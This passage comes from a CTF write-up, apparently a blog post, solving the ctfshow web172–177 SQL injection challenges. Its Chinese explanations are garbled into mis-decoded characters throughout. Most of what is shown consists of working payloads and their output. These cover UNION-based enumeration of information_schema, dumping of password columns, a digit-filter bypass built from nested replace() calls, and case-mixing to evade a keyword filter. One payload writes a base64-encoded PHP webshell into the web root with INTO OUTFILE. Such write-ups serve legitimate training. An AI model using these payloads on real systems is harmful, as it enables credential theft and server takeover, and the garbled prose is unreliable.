</code></pre><p>å‘ç° ctfshow_user æ²¡æœ‰ flagï¼ŒæŸ¥çœ‹ ctfshow_user2</p><p>1'union select 1,(select group_concat(password) from ctfshow_user2),database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin,111,222,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,ctfshow&#123;707d21f4-6c7d-409d-9c94-ba6997c6f764&#125;&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>å‘ç° flag</p><pre><code>ctfshow&#123;707d21f4-6c7d-409d-9c94-ba6997c6f764&#125;
</code></pre><h2 id="web173"><a class="anchor" href="#web173">#</a> web173</h2><p>è€ƒå¯Ÿ sql åŸºç¡€</p><p>è¿˜æ˜¯ç†Ÿæ‚‰çš„ç•Œé¢ï¼Œè€è§„çŸ©è¿˜æ˜¯æ£€æŸ¥æºä»£ç ï¼Œåº•éƒ¨å‘ç° select.js è¿˜æ˜¯é€šè¿‡ /api/ æŸ¥è¯¢</p><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206144532326.png" alt="image-20230206144532326"></p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>layui<span class="token operator">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token keyword">var</span> table <span class="token operator">=</span> layui<span class="token operator">.</span>table<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  table<span class="token operator">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    elem<span class="token punctuation">:</span> <span class="token string single-quoted-string">'#user'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">id</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'user_table'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">title</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'Ã§â€Â¨Ã¦Ë†Â·Ã¥Ë†â€”Ã¨Â¡Â¨'</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">height</span><span class="token punctuation">:</span> <span class="token number">500</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">page</span><span class="token punctuation">:</span><span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">url</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"api/"</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">cols</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      <span class="token punctuation">&#123;</span>field<span class="token punctuation">:</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">,</span> <span class="token argument-name">title</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'ID'</span><span class="token punctuation">,</span> <span class="token argument-name">sort</span><span class="token punctuation">:</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token argument-name">fixed</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'left'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>      <span class="token punctuation">,</span><span class="token punctuation">&#123;</span>field<span class="token punctuation">:</span> <span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token argument-name">title</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'Ã§â€Â¨Ã¦Ë†Â·Ã¥ÂÂ'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>      <span class="token punctuation">,</span><span class="token punctuation">&#123;</span>field<span class="token punctuation">:</span> <span class="token string single-quoted-string">'password'</span><span class="token punctuation">,</span> <span class="token argument-name">title</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'Ã¥Â¯â€ Ã§ Â'</span><span class="token punctuation">,</span><span class="token argument-name">edit</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">]</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  table<span class="token operator">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'toolbar(user-filter)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token keyword">var</span> checkStatus <span class="token operator">=</span> table<span class="token operator">.</span><span class="token function">checkStatus</span><span class="token punctuation">(</span>obj<span class="token operator">.</span>config<span class="token operator">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token keyword">switch</span><span class="token punctuation">(</span>obj<span class="token operator">.</span>event<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'add'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>      layer<span class="token operator">.</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Ã¦Â·Â»Ã¥Å  '</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>      layer<span class="token operator">.</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Ã¥Ë† Ã©â„¢Â¤'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>      layer<span class="token operator">.</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Ã¦â€ºÂ´Ã¦â€“Â°'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>layui<span class="token operator">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'element'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token keyword">var</span> element <span class="token operator">=</span> layui<span class="token operator">.</span>element<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  element<span class="token operator">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tab(nav)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    console<span class="token operator">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>layui<span class="token operator">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'form'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>  <span class="token keyword">var</span> form <span class="token operator">=</span> layui<span class="token operator">.</span>form<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>  form<span class="token operator">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'submit(*)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">var</span> id <span class="token operator">=</span> data<span class="token operator">.</span>field<span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">var</span> table <span class="token operator">=</span> layui<span class="token operator">.</span>table<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    table<span class="token operator">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user_table'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>      url<span class="token punctuation">:</span><span class="token string single-quoted-string">'api/?id='</span><span class="token operator">+</span>id</pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> <span class="token comment">//Ã©ËœÂ»Ã¦Â­Â¢Ã¨Â¡Â¨Ã¥Ââ€¢Ã¨Â·Â³Ã¨Â½Â¬Ã£â‚¬â€šÃ¥Â¦â€šÃ¦Å¾Å“Ã©Å“â‚¬Ã¨Â¦ÂÃ¨Â¡Â¨Ã¥Ââ€¢Ã¨Â·Â³Ã¨Â½Â¬Ã¯Â¼Å’Ã¥Å½Â»Ã¦Å½â€°Ã¨Â¿â„¢Ã¦Â®ÂµÃ¥ÂÂ³Ã¥ÂÂ¯Ã£â‚¬â€š</span></pre></td></tr><tr><td data-num="48"></td><td><pre>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>æœ€å¤šä¸‰åˆ—</p><p>id=1'order by 3%23</p><p>id=1'union select 1,2,database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;2&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>æ¥ç€è”åˆæŸ¥è¯¢</p><p>1'union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;information_schema,test,mysql,performance_schema,ctfshow_web&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>æ¥ç€æŸ¥è¯¢è¡¨</p><p>1'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow_user,ctfshow_user2,ctfshow_user3&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>å‘ç°ä¸‰ä¸ªè¡¨ï¼Œæ¥ç€çˆ†å­—æ®µ</p><p>1'union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;id,username,password&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>æœ‰ idã€usernameã€password ä¸‰ä¸ªå­—æ®µ</p><p>æ¥ç€çˆ†å­—æ®µå†…å®¹</p><p>id=1'union select 1,(select group_concat(password) from ctfshow_user),database()%23</p><p>æ²¡æ‰¾åˆ° flagï¼Œä¸‹ä¸€ä¸ªè¡¨</p><p>id=1'union select 1,(select group_concat(password) from ctfshow_user3),database()%23</p><pre><code>&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin,111,222,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,ctfshow&#123;e164dc8d-e504-437a-8d4f-167a217b0dbc&#125;&quot;,&quot;password&quot;:&quot;ctfshow_web&quot;&#125;]&#125;
</code></pre><p>å‘ç° flag</p><pre><code>ctfshow&#123;e164dc8d-e504-437a-8d4f-167a217b0dbc&#125;
</code></pre><h2 id="web174"><a class="anchor" href="#web174">#</a> web174</h2><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230206155210337.png" alt="image-20230206155210337"></p><p>è€è§„çŸ©æŸ¥çœ‹æºä»£ç æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œåº•éƒ¨æ‰¾åˆ° v4.jsï¼Œæ³¨å…¥ç‚¹åœ¨ api/v4.php</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>layui<span class="token operator">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token keyword">var</span> table <span class="token operator">=</span> layui<span class="token operator">.</span>table<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  table<span class="token operator">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    elem<span class="token punctuation">:</span> <span class="token string single-quoted-string">'#user'</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">id</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'user_table'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">title</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'Ã§â€Â¨Ã¦Ë†Â·Ã¥Ë†â€”Ã¨Â¡Â¨'</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">height</span><span class="token punctuation">:</span> <span class="token number">500</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">page</span><span class="token punctuation">:</span><span class="token constant boolean">true</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">url</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"api/v4.php"</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">,</span><span class="token argument-name">cols</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      <span class="token punctuation">&#123;</span>field<span class="token punctuation">:</span> <span class="token string single-quoted-string">'id'</span><span class="token punctuation">,</span> <span class="token argument-name">title</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'ID'</span><span class="token punctuation">,</span> <span class="token argument-name">sort</span><span class="token punctuation">:</span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token argument-name">fixed</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'left'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>      <span class="token punctuation">,</span><span class="token punctuation">&#123;</span>field<span class="token punctuation">:</span> <span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token argument-name">title</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'Ã§â€Â¨Ã¦Ë†Â·Ã¥ÂÂ'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>      <span class="token punctuation">,</span><span class="token punctuation">&#123;</span>field<span class="token punctuation">:</span> <span class="token string single-quoted-string">'password'</span><span class="token punctuation">,</span> <span class="token argument-name">title</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'Ã¥Â¯â€ Ã§ Â'</span><span class="token punctuation">,</span><span class="token argument-name">edit</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'text'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">]</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  table<span class="token operator">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'toolbar(user-filter)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token keyword">var</span> checkStatus <span class="token operator">=</span> table<span class="token operator">.</span><span class="token function">checkStatus</span><span class="token punctuation">(</span>obj<span class="token operator">.</span>config<span class="token operator">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token keyword">switch</span><span class="token punctuation">(</span>obj<span class="token operator">.</span>event<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'add'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>      layer<span class="token operator">.</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Ã¦Â·Â»Ã¥Å  '</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>      layer<span class="token operator">.</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Ã¥Ë† Ã©â„¢Â¤'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">case</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>      layer<span class="token operator">.</span><span class="token function">msg</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Ã¦â€ºÂ´Ã¦â€“Â°'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>layui<span class="token operator">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'element'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token keyword">var</span> element <span class="token operator">=</span> layui<span class="token operator">.</span>element<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  element<span class="token operator">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tab(nav)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    console<span class="token operator">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>layui<span class="token operator">.</span><span class="token keyword">use</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'form'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>  <span class="token keyword">var</span> form <span class="token operator">=</span> layui<span class="token operator">.</span>form<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>  form<span class="token operator">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'submit(*)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">var</span> id <span class="token operator">=</span> data<span class="token operator">.</span>field<span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">var</span> table <span class="token operator">=</span> layui<span class="token operator">.</span>table<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    table<span class="token operator">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user_table'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>      url<span class="token punctuation">:</span><span class="token string single-quoted-string">'api/v4.php?id='</span><span class="token operator">+</span>id</pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="48"></td><td><pre>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>è¿‡æ»¤äº†æ•°å­—ï¼Œå¯ä»¥ç”¨ replace å‡½æ•°è¿›è¡Œæ•°å­—æ›¿æ¢</p><pre><code>payload:
99' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&quot;1&quot;,&quot;!&quot;),&quot;2&quot;,&quot;@&quot;),&quot;3&quot;,&quot;#&quot;),&quot;4&quot;,&quot;$&quot;),&quot;5&quot;,&quot;%&quot;),&quot;6&quot;,&quot;^&quot;),&quot;7&quot;,&quot;&amp;&quot;),&quot;8&quot;,&quot;*&quot;),&quot;9&quot;,&quot;(&quot;),&quot;0&quot;,&quot;)&quot;) from ctfshow_user4 where username='flag
</code></pre><pre><code>ctfshow&#123;3892228b-3a70-4a05-bf92-9b515fa4c2b9&#125;
</code></pre><h2 id="web175"><a class="anchor" href="#web175">#</a> web175</h2><pre><code>//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag
    if(!preg_match('/[\x00-\x7f]/i', json_encode($ret)))&#123;
      $ret['msg']='æŸ¥è¯¢æˆåŠŸ';
    &#125;
</code></pre><pre><code>åˆ©ç”¨base64å†™ä¸€å¥è¯æœ¨é©¬è¿æ¥

é¦–å…ˆæŠŠä¸€å¥è¯æœ¨é©¬åŠ å¯†æˆbase64åœ¨åŠ å¯†æˆurlç¼–ç ï¼Œåœ¨æ‰§è¡Œåˆ°webåœ°å€é‡Œ

/api/config.phpé‡Œé¢æœ‰æ•°æ®åº“è´¦å·å¯†ç 

payload:
99' union select 1,from_base64('%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%4a%32%45%6e%58%53%6b%37%50%7a%34%3d') into outfile '/var/www/html/1.php
</code></pre><pre><code>ctfshow&#123;937177d2-74e9-4c06-b41c-73335765d568&#125;
</code></pre><h2 id="web176"><a class="anchor" href="#web176">#</a> web176</h2><p>æŸ¥è¯¢è¯­å¥</p><pre><code>//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;;
      
</code></pre><p>è¿”å›é€»è¾‘</p><pre><code>//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str)&#123;
   //ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º
  &#125;
      
</code></pre><figure class="highlight plaintext"><figcaption data-lang="plaintext"></figcaption><table><tr><td data-num="1"></td><td><pre>è¿‡æ»¤äº†ä¸€äº›å†…å®¹ï¼Œä½†æˆ‘ä»¬æ— æ³•æŸ¥çœ‹</pre></td></tr><tr><td data-num="2"></td><td><pre>è¯•è¿‡ä¹‹åå‘ç°æ˜¯è¿‡æ»¤äº†å…³é”®å­—ï¼Œå¤§å°å†™ç»•è¿‡å³å¯</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>payload1(ä¸‡èƒ½å¯†ç ):</pre></td></tr><tr><td data-num="5"></td><td><pre>1â€™ or 1=1--+</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>payload2:</pre></td></tr><tr><td data-num="8"></td><td><pre>1' union select 1,2,3--+	//å‘ç°æ²¡å›æ˜¾ï¼Œå¯èƒ½æ˜¯è¿‡æ»¤æ‰äº†</pre></td></tr><tr><td data-num="9"></td><td><pre>1' UniOn SelEct 1,2,database()--+		//å¤§å°å†™ç»•è¿‡æœ‰å›æ˜¾å¾—åˆ°æ•°æ®åº“å</pre></td></tr><tr><td data-num="10"></td><td><pre>//çˆ†è¡¨</pre></td></tr><tr><td data-num="11"></td><td><pre>1' UniOn SelEct 1,(SelEct group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()--+</pre></td></tr><tr><td data-num="12"></td><td><pre>//çˆ†å­—æ®µ</pre></td></tr><tr><td data-num="13"></td><td><pre>1' UniOn SelEct 1,(SelEct group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()--+</pre></td></tr><tr><td data-num="14"></td><td><pre>//çˆ†å­—æ®µå†…å®¹</pre></td></tr><tr><td data-num="15"></td><td><pre>1' UniOn SelEct 1,(SelEct group_concat(password) from ctfshow_user),database()--+</pre></td></tr><tr><td data-num="16"></td><td><pre>å¾—åˆ°flag</pre></td></tr></table></figure><pre><code>ctfshow&#123;9cf120a8-bb3a-4861-b234-f258cc19354f&#125;
</code></pre><h2 id="web177"><a class="anchor" href="#web177">#</a> web177</h2><p>æŸ¥è¯¢è¯­å¥</p><pre><code>//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &quot;select id,username,password from ctfshow_user where username !='flag' and id = '&quot;.$_GET['id'].&quot;' limit 1;&quot;;
      
</code></pre><p>è¿”å›é€»è¾‘</p><pre><code>//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str)&#123;
